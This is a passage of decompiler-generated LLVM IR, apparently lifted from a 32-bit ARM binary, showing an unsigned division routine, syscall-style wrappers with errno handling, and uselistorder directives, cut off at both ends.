  uselistorder i32 %stack_var_-44.0.in38, { 4, 3, 2, 1, 0 }
  uselistorder i8* %storemerge5, { 1, 0 }
  uselistorder i32 %v1_ff5c, { 1, 0 }
  uselistorder i8* %storemerge534, { 1, 0 }
  uselistorder i32 %v1_ff24, { 1, 0 }
  uselistorder i8* %stack_var_-76.018, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_fe90, { 2, 1, 0 }
  uselistorder i32 %v1_fe5c, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i8* %storemerge6, { 0, 1, 3, 4, 2 }
  uselistorder i1 %v9_fb60, { 1, 0 }
  uselistorder i32 %v3_fb74, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_faa4, { 1, 0 }
  uselistorder i32 %v3_fad8, { 1, 2, 0, 3 }
  uselistorder i32 %v3_fa4c, { 1, 0 }
  uselistorder i32 %v1_fa30, { 1, 0 }
  uselistorder i32 %v5_f970, { 1, 0 }
  uselistorder i32 %v1_f908, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_f924, { 1, 0 }
  uselistorder i32 %v2_f918, { 1, 0 }
  uselistorder i32 %v2_101ec, { 2, 0, 1 }
  uselistorder i32 %v2_ffa8, { 2, 5, 3, 4, 6, 1, 0 }
  uselistorder i8* %v4_1023c, { 2, 0, 1 }
  uselistorder i32 %v2_1022c, { 8, 0, 3, 4, 5, 6, 7, 1, 2 }
  uselistorder i32 %v0_f7d0, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge11, { 2, 0, 1 }
  uselistorder i32 %v2_f72c, { 1, 0 }
  uselistorder i32 %v2_f65c, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_12410, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1a058.177 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @function_93f8, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_a104, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_1092c, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_29774.154, { 0, 2, 1, 3, 4 }
  uselistorder i32 (i32)* @function_8584, { 1, 0 }
  uselistorder i32* @global_var_23708.51, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_29778.54, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @function_8f1c, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_23700.47, { 2, 3, 4, 5, 6, 7, 8, 0, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32)* @function_142e4, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10580, { 2, 1, 0 }
  uselistorder i32 ()* @function_1054c, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10a58, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19f88.133 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19f80.137 to i32), { 1, 0 }
  uselistorder i32 ()* @function_8228, { 1, 0 }
  uselistorder i32 ()* @function_8250, { 1, 0 }
  uselistorder i32 (i32)* @function_8204, { 1, 0 }
  uselistorder i32 (i32)* @function_8368, { 1, 0 }
  uselistorder i32 (i32)* @function_13c5c, { 1, 0 }
  uselistorder i32 (i32*)* @function_1051c, { 0, 1, 2, 3, 4, 5, 6, 7, 21, 22, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 18 }
  uselistorder label %dec_label_pc_10258, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1021c, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_101dc, { 1, 0 }
  uselistorder label %dec_label_pc_1018c, { 1, 0 }
  uselistorder label %dec_label_pc_100c4, { 1, 0 }
  uselistorder label %dec_label_pc_10098, { 1, 0 }
  uselistorder label %dec_label_pc_10060, { 1, 0 }
  uselistorder label %dec_label_pc_ff38, { 1, 0 }
  uselistorder label %dec_label_pc_ff14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ff04, { 1, 0 }
  uselistorder label %dec_label_pc_fe8c, { 1, 0 }
  uselistorder label %dec_label_pc_fdf8, { 1, 0 }
  uselistorder label %dec_label_pc_fdbc, { 1, 0 }
  uselistorder label %dec_label_pc_fd3c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fc9c, { 1, 0 }
  uselistorder label %dec_label_pc_fb98, { 1, 0 }
  uselistorder label %dec_label_pc_fb18, { 1, 0 }
  uselistorder label %dec_label_pc_fa88, { 1, 0 }
  uselistorder label %dec_label_pc_f958, { 1, 0 }
  uselistorder label %dec_label_pc_f848, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f830, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f77c, { 1, 0 }
}

define i32 @function_102cc() local_unnamed_addr {
dec_label_pc_102cc:
  %r2.global-to-local = alloca i32, align 4
  %v0_102cc = load i32, i32* @r1, align 4
  %v1_102cc = add i32 %v0_102cc, -1
  store i32 %v1_102cc, i32* %r2.global-to-local, align 4
  %v2_102cc = icmp eq i32 %v0_102cc, 0
  %v7_102cc = icmp eq i32 %v0_102cc, 1
  %v0_102d0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_102cc, i32 %v0_102d0)
  br i1 %v2_102cc, label %dec_label_pc_103b4, label %dec_label_pc_102d8

dec_label_pc_102d8:                               ; preds = %dec_label_pc_102cc
  %v0_102d8 = load i32, i32* @r0, align 4
  %v1_102d8 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_102d8, %v1_102d8
  br i1 %tmp, label %dec_label_pc_102e0, label %dec_label_pc_1036c

dec_label_pc_102e0:                               ; preds = %dec_label_pc_102d8
  %v1_102e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_102e0 = and i32 %v1_102e0, %v1_102d8
  %v4_102e0 = icmp eq i32 %v2_102e0, 0
  br i1 %v4_102e0, label %dec_label_pc_10378, label %dec_label_pc_102e8

dec_label_pc_102e8:                               ; preds = %dec_label_pc_102e0
  %v3_102e8 = icmp ult i32 %v1_102d8, 536870912
  br i1 %v3_102e8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_102e8
  %v4_102ec = mul i32 %v1_102d8, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_102e8, %.thread
  %v0_1030c.pr36.ph = phi i32 [ %v4_102ec, %.thread ], [ %v1_102d8, %dec_label_pc_102e8 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_102e8 ]
  store i32 %storemerge133, i32* @r3, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_1030c.pr36 = phi i32 [ %v4_10300, %bb81 ], [ %v0_1030c.pr36.ph, %.preheader.preheader ]
  %v1_10304 = phi i32 [ %v4_10304, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_102f8 = icmp ugt i32 %v0_1030c.pr36, 268435455
  br i1 %v2_102f8, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_1030cthread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_102fc = icmp ult i32 %v0_1030c.pr36, %v0_102d8
  br i1 %v4_102fc, label %bb80, label %dec_label_pc_1030cthread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_10300 = and i32 %v0_1030c.pr36, 268435456
  %v3_10300 = icmp eq i32 %v2_10300, 0
  %v4_10300 = mul i32 %v0_1030c.pr36, 16
  br i1 %v3_10300, label %bb81, label %dec_label_pc_1030c.loopexit

bb81:                                             ; preds = %bb80
  %v2_10304 = and i32 %v1_10304, 268435456
  %v3_10304 = icmp eq i32 %v2_10304, 0
  %v4_10304 = mul i32 %v1_10304, 16
  store i32 %v4_10304, i32* @r3, align 4
  br i1 %v3_10304, label %.preheader, label %dec_label_pc_1030cthread-pre-split.loopexit.loopexit

dec_label_pc_1030cthread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_1031848.ph = phi i32 [ %v1_10304, %bb ], [ %v4_10304, %bb81 ]
  %v0_1030c.pr38.ph = phi i32 [ %v0_1030c.pr36, %bb ], [ %v4_10300, %bb81 ]
  br label %dec_label_pc_1030cthread-pre-split.loopexit

dec_label_pc_1030cthread-pre-split.loopexit:      ; preds = %dec_label_pc_1030cthread-pre-split.loopexit.loopexit, %.thread2
  %v1_1031848 = phi i32 [ %v1_10304, %.thread2 ], [ %v1_1031848.ph, %dec_label_pc_1030cthread-pre-split.loopexit.loopexit ]
  %v0_1030c.pr38 = phi i32 [ %v0_1030c.pr36, %.thread2 ], [ %v0_1030c.pr38.ph, %dec_label_pc_1030cthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1030cthread-pre-split

dec_label_pc_1030cthread-pre-split:               ; preds = %dec_label_pc_1030cthread-pre-split.loopexit, %bb83
  %v1_1031846 = phi i32 [ %v1_1031848, %dec_label_pc_1030cthread-pre-split.loopexit ], [ %v3_10318, %bb83 ]
  %v0_1030c.pr = phi i32 [ %v0_1030c.pr38, %dec_label_pc_1030cthread-pre-split.loopexit ], [ %v3_10314, %bb83 ]
  br label %dec_label_pc_1030c

dec_label_pc_1030c.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_1030c

dec_label_pc_1030c:                               ; preds = %dec_label_pc_1030c.loopexit, %dec_label_pc_1030cthread-pre-split
  %v1_10318 = phi i32 [ %v1_1031846, %dec_label_pc_1030cthread-pre-split ], [ %v1_10304, %dec_label_pc_1030c.loopexit ]
  %v1_10314 = phi i32 [ %v0_1030c.pr, %dec_label_pc_1030cthread-pre-split ], [ %v4_10300, %dec_label_pc_1030c.loopexit ]
  %v2_1030c = icmp slt i32 %v1_10314, 0
  br i1 %v2_1030c, label %dec_label_pc_10320, label %bb82

bb82:                                             ; preds = %dec_label_pc_1030c
  %v4_10310 = icmp ult i32 %v1_10314, %v0_102d8
  br i1 %v4_10310, label %bb83, label %dec_label_pc_10320

bb83:                                             ; preds = %bb82
  %v3_10314 = mul i32 %v1_10314, 2
  %v2_10318 = icmp slt i32 %v1_10318, 0
  %v3_10318 = mul i32 %v1_10318, 2
  store i32 %v3_10318, i32* @r3, align 4
  br i1 %v2_10318, label %dec_label_pc_10320, label %dec_label_pc_1030cthread-pre-split

dec_label_pc_10320:                               ; preds = %bb82, %dec_label_pc_1030c, %bb83
  %v2_1032c59 = phi i32 [ %v3_10318, %bb83 ], [ %v1_10318, %bb82 ], [ %v1_10318, %dec_label_pc_1030c ]
  %v1_1032451 = phi i32 [ %v3_10314, %bb83 ], [ %v1_10314, %bb82 ], [ %v1_10314, %dec_label_pc_1030c ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %.thread11, %dec_label_pc_10320
  %v1_10358 = phi i32 [ %v4_10358, %.thread11 ], [ %v2_1032c59, %dec_label_pc_10320 ]
  %v1_1032c = phi i32 [ %v0_10364, %.thread11 ], [ 0, %dec_label_pc_10320 ]
  %v1_1035c = phi i32 [ %v4_1035c, %.thread11 ], [ %v1_1032451, %dec_label_pc_10320 ]
  %v1_10328 = phi i32 [ %v0_10354, %.thread11 ], [ %v0_102d8, %dec_label_pc_10320 ]
  %v3_10324 = icmp ult i32 %v1_10328, %v1_1035c
  br i1 %v3_10324, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_10324
  %v3_10328 = sub i32 %v1_10328, %v1_1035c
  %v3_1032c = or i32 %v1_1032c, %v1_10358
  store i32 %v3_1032c, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_10324, %bb84
  %v1_10334 = phi i32 [ %v1_10328, %dec_label_pc_10324 ], [ %v3_10328, %bb84 ]
  %v1_10338 = phi i32 [ %v1_1032c, %dec_label_pc_10324 ], [ %v3_1032c, %bb84 ]
  %v4_10330 = udiv i32 %v1_1035c, 2
  %v6_10330 = icmp ult i32 %v1_10334, %v4_10330
  br i1 %v6_10330, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_10334 = urem i32 %v1_1035c, 2
  %v4_10334 = icmp eq i32 %v3_10334, 0
  %v6_10334 = sub i32 %v1_10334, %v4_10330
  br i1 %v4_10334, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_10338 = udiv i32 %v1_10358, 2
  %v6_10338 = or i32 %v1_10338, %v5_10338
  store i32 %v6_10338, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_10340 = phi i32 [ %v6_10334, %bb85 ], [ %v1_10334, %.thread7 ], [ %v6_10334, %bb86 ]
  %v1_10344 = phi i32 [ %v1_10338, %bb85 ], [ %v1_10338, %.thread7 ], [ %v6_10338, %bb86 ]
  %v4_1033c = udiv i32 %v1_1035c, 4
  %v6_1033c = icmp ult i32 %v1_10340, %v4_1033c
  br i1 %v6_1033c, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_10340 = and i32 %v1_1035c, 2
  %v4_10340 = icmp eq i32 %v3_10340, 0
  %v6_10340 = sub i32 %v1_10340, %v4_1033c
  br i1 %v4_10340, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_10344 = udiv i32 %v1_10358, 4
  %v6_10344 = or i32 %v1_10344, %v5_10344
  store i32 %v6_10344, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_1034c = phi i32 [ %v6_10340, %bb87 ], [ %v1_10340, %.thread8 ], [ %v6_10340, %bb88 ]
  %v1_10350 = phi i32 [ %v1_10344, %bb87 ], [ %v1_10344, %.thread8 ], [ %v6_10344, %bb88 ]
  %v4_10348 = udiv i32 %v1_1035c, 8
  %v6_10348 = icmp ult i32 %v1_1034c, %v4_10348
  br i1 %v6_10348, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_1034c = and i32 %v1_1035c, 4
  %v4_1034c = icmp eq i32 %v3_1034c, 0
  %v6_1034c = sub i32 %v1_1034c, %v4_10348
  br i1 %v4_1034c, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_10350 = udiv i32 %v1_10358, 8
  %v6_10350 = or i32 %v1_10350, %v5_10350
  store i32 %v6_10350, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_10364 = phi i32 [ %v1_10350, %bb89 ], [ %v1_10350, %.thread9 ], [ %v6_10350, %bb90 ]
  %v0_10354 = phi i32 [ %v6_1034c, %bb89 ], [ %v1_1034c, %.thread9 ], [ %v6_1034c, %bb90 ]
  %v2_10354 = icmp eq i32 %v0_10354, 0
  br i1 %v2_10354, label %dec_label_pc_10364, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %v4_10358 = udiv i32 %v1_10358, 16
  store i32 %v4_10358, i32* @r3, align 4
  %tmp138 = icmp ult i32 %v1_10358, 16
  br i1 %tmp138, label %dec_label_pc_10364, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_1035c = udiv i32 %v1_1035c, 16
  br label %dec_label_pc_10324

dec_label_pc_10364:                               ; preds = %thread-pre-split, %bb91
  ret i32 %v0_10364

dec_label_pc_1036c:                               ; preds = %dec_label_pc_102d8
  %v9_102d8 = icmp eq i32 %v0_102d8, %v1_102d8
  %. = zext i1 %v9_102d8 to i32
  ret i32 %.

dec_label_pc_10378:                               ; preds = %dec_label_pc_102e0
  %v2_10378 = icmp ugt i32 %v1_102d8, 65535
  br i1 %v2_10378, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_10378
  %v2_1037c = and i32 %v1_102d8, 32768
  %v3_1037c = icmp eq i32 %v2_1037c, 0
  %v4_1037c = udiv i32 %v1_102d8, 65536
  br i1 %v3_1037c, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_10378
  %v0_1038865 = phi i32 [ %v1_102d8, %dec_label_pc_10378 ], [ %v4_1037c, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_1038c = phi i32 [ %v0_1038865, %.thread16 ], [ %v4_1037c, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_10388 = icmp ugt i32 %v1_1038c, 255
  br i1 %v2_10388, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_1038c = and i32 %v1_1038c, 128
  %v3_1038c = icmp eq i32 %v2_1038c, 0
  %v4_1038c = udiv i32 %v1_1038c, 256
  br i1 %v3_1038c, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_10390 = or i32 %storemerge, 8
  store i32 %v2_10390, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_1039c = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_10390, %bb98 ]
  %v1_10398 = phi i32 [ %v1_1038c, %bb96 ], [ %v4_1038c, %bb97 ], [ %v4_1038c, %bb98 ]
  %v2_10394 = icmp ugt i32 %v1_10398, 15
  br i1 %v2_10394, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_10398 = and i32 %v1_10398, 8
  %v3_10398 = icmp eq i32 %v2_10398, 0
  %v4_10398 = udiv i32 %v1_10398, 16
  br i1 %v3_10398, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_1039c = add nsw i32 %v1_1039c, 4
  store i32 %v2_1039c, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_103a4 = phi i32 [ %v1_1039c, %.thread17 ], [ %v1_1039c, %bb99 ], [ %v2_1039c, %bb100 ]
  %v5_103a8 = phi i32 [ %v1_10398, %.thread17 ], [ %v4_10398, %bb99 ], [ %v4_10398, %bb100 ]
  %v2_103a0 = icmp ugt i32 %v5_103a8, 3
  %v7_103a0 = icmp eq i32 %v5_103a8, 4
  %v2_103a4 = xor i1 %v7_103a0, true
  %v3_103a4 = and i1 %v2_103a0, %v2_103a4
  br i1 %v3_103a4, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_103a4 = add nsw i32 %v4_103a4, 3
  store i32 %v5_103a4, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_103a8 = phi i32 [ %v4_103a4, %.thread18 ], [ %v5_103a4, %bb101 ]
  %v2_103a8 = xor i1 %v2_103a0, true
  %v3_103a8 = or i1 %v7_103a0, %v2_103a8
  br i1 %v3_103a8, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_103a8 = udiv i32 %v5_103a8, 2
  %v9_103a8 = add i32 %v4_103a8, %v8_103a8
  store i32 %v9_103a8, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_103ac = phi i32 [ %v4_103a8, %bb102 ], [ %v9_103a8, %bb103 ]
  %v6_103ac = lshr i32 %v0_102d8, %v1_103ac
  ret i32 %v6_103ac

dec_label_pc_103b4:                               ; preds = %dec_label_pc_102cc
  %v0_103b4 = load i32, i32* @lr, align 4
  %v0_103b8 = call i32 @function_103e0()
  store i32 %v0_103b4, i32* @lr, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_103a8, { 1, 0 }
  uselistorder i1 %v7_103a0, { 1, 0 }
  uselistorder i32 %v4_10398, { 1, 0 }
  uselistorder i32 %v1_10398, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10390, { 1, 0 }
  uselistorder i32 %v4_1038c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1038c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1037c, { 1, 0 }
  uselistorder i32 %v0_10354, { 1, 0 }
  uselistorder i32 %v4_10348, { 1, 0 }
  uselistorder i32 %v1_10350, { 1, 2, 0 }
  uselistorder i32 %v4_1033c, { 1, 0 }
  uselistorder i32 %v1_10344, { 1, 2, 0 }
  uselistorder i32 %v4_10330, { 1, 0 }
  uselistorder i32 %v1_10338, { 1, 2, 0 }
  uselistorder i32 %v1_1035c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1032c, { 1, 0 }
  uselistorder i32 %v3_10318, { 2, 0, 1 }
  uselistorder i32 %v3_10314, { 1, 0 }
  uselistorder i32 %v1_10314, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_10318, { 1, 2, 0, 3 }
  uselistorder i32 %v4_10304, { 2, 0, 1 }
  uselistorder i32 %v4_10300, { 2, 1, 0 }
  uselistorder i32 %v1_10304, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1030c.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_102d8, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_102d8, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_102cc, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_10364, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_10320, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1030cthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_103c8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_103c8:
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_103cc = call i32 @function_102cc()
  ret i32 %v0_103cc
}

define i32 @function_103e0() local_unnamed_addr {
dec_label_pc_103e0:
  %v1_103e8 = call i32 @function_128f0(i32 8)
  ret i32 %v1_103e8
}

define i32 @function_10400() local_unnamed_addr {
dec_label_pc_10400:
  %v0_10410 = load i32, i32* @r0, align 4
  %v2_10410 = icmp ugt i32 %v0_10410, -4097
  br i1 %v2_10410, label %bb1, label %bb

bb:                                               ; preds = %dec_label_pc_10400
  ret i32 %v0_10410

bb1:                                              ; preds = %dec_label_pc_10400
  %v4_1041c = icmp eq i32 %v0_10410, -38
  br i1 %v4_1041c, label %dec_label_pc_10424, label %bb2

dec_label_pc_10424:                               ; preds = %bb1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_10424, %bb1
  %v0_1043c = call i32 @function_1501c()
  ret i32 %v0_1043c
}

define i32 @function_10440(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10440:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_10440 = load i32, i32* @r7, align 4
  store i32 %v3_10440, i32* %stack_var_-8, align 4
  %v0_1044c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1044c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1044c, -4095
  br i1 %tmp, label %dec_label_pc_1046c, label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_10440
  %v0_1045c = call i32 @function_1095c()
  %v0_10460 = load i32, i32* %r7.global-to-local, align 4
  %v1_10460 = sub i32 0, %v0_10460
  %v2_10464 = inttoptr i32 %v0_1045c to i32*
  store i32 %v1_10460, i32* %v2_10464, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1046c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1046c

dec_label_pc_1046c:                               ; preds = %dec_label_pc_10440, %dec_label_pc_1045c
  %v1_10470 = phi i32 [ %v0_1044c, %dec_label_pc_10440 ], [ -1, %dec_label_pc_1045c ]
  %v2_1046c = phi i32 [ %v3_10440, %dec_label_pc_10440 ], [ %v2_1046c.pre, %dec_label_pc_1045c ]
  store i32 %v2_1046c, i32* @r7, align 4
  ret i32 %v1_10470

; uselistorder directives
  uselistorder i32 %v0_1044c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1046c, { 1, 0 }
}

define i32 @function_10474(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10474:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v6_10474 = load i32, i32* @r2, align 4
  %v9_10474 = load i32, i32* @r3, align 4
  store i32 %v9_10474, i32* %stack_var_-4, align 4
  %v1_10484 = and i32 %arg2, 64
  %v2_10484 = icmp eq i32 %v1_10484, 0
  br i1 %v2_10484, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_10474
  %v3_1048c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v3_1048c, i32* @r3, align 4
  %phitmp = urem i32 %v6_10474, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10474, %bb
  %v0_10490 = phi i32 [ 0, %dec_label_pc_10474 ], [ %phitmp, %bb ]
  store i32 %v0_10490, i32* @r2, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_104c0, label %dec_label_pc_104b0

dec_label_pc_104b0:                               ; preds = %.thread
  %v0_104b0 = call i32 @function_1095c()
  %v0_104b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_104b4 = sub i32 0, %v0_104b4
  store i32 %v1_104b4, i32* @r3, align 4
  %v2_104b8 = inttoptr i32 %v0_104b0 to i32*
  store i32 %v1_104b4, i32* %v2_104b8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_104c0

dec_label_pc_104c0:                               ; preds = %.thread, %dec_label_pc_104b0
  %v0_104c0 = phi i32 [ %arg1, %.thread ], [ -1, %dec_label_pc_104b0 ]
  ret i32 %v0_104c0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_104c0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_104d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_104d4:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_104d4 = load i32, i32* @r7, align 4
  store i32 %v3_104d4, i32* %stack_var_-8, align 4
  %v0_104e0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_104e0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_104e0, -4095
  br i1 %tmp, label %dec_label_pc_10500, label %dec_label_pc_104f0

dec_label_pc_104f0:                               ; preds = %dec_label_pc_104d4
  %v0_104f0 = call i32 @function_1095c()
  %v0_104f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_104f4 = sub i32 0, %v0_104f4
  %v2_104f8 = inttoptr i32 %v0_104f0 to i32*
  store i32 %v1_104f4, i32* %v2_104f8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10500.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_10500

dec_label_pc_10500:                               ; preds = %dec_label_pc_104d4, %dec_label_pc_104f0
  %v1_10504 = phi i32 [ %v0_104e0, %dec_label_pc_104d4 ], [ -1, %dec_label_pc_104f0 ]
  %v2_10500 = phi i32 [ %v3_104d4, %dec_label_pc_104d4 ], [ %v2_10500.pre, %dec_label_pc_104f0 ]
  store i32 %v2_10500, i32* @r7, align 4
  ret i32 %v1_10504

; uselistorder directives
  uselistorder i32 %v0_104e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10500, { 1, 0 }
}

define i32 @function_10508() local_unnamed_addr {
dec_label_pc_10508:
  %v1_10518 = load i32, i32* @r0, align 4
  ret i32 %v1_10518
}

define i32 @function_1051c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1051c:
  %stack_var_-16 = alloca i32, align 4
  %v2_10520 = ptrtoint i32* %stack_var_-16 to i32
  %v2_10530 = call i32 @function_106a4(i32 %v2_10520, i32 0)
  %v2_10534 = load i32, i32* %stack_var_-16, align 4
  %v2_10538 = icmp eq i32* %arg1, null
  br i1 %v2_10538, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1051c
  store i32 %v2_10534, i32* %arg1, align 4
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_1051c, %bb
  ret i32 %v2_10534

; uselistorder directives
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_1054c() local_unnamed_addr {
dec_label_pc_1054c:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
